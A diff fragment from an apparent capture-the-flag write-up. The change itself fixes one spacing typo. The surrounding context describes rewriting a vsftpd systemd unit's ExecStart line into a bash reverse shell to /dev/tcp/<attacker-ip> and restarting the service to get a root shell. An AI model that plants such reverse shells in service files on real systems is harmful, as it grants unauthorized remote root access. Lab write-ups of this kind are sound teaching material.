@@ -121,4 +121,4 @@ When this file is opened, `ExecStart=` command needs to be changed to the revers
 `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1'`
 
 Save the file and restart FTP service with `sudo /usr/sbin/service vsftpd restart`. It gives a warning to reload units with `systemctl daemon-reload`. Reload the units and restart the FTP service again. Volia, the netcat listener should have access to the root shell of the webserver!
-Now navigate to the `root` folder and grab the flag from the `root.txt`file :)
+Now navigate to the `root` folder and grab the flag from the `root.txt` file :)
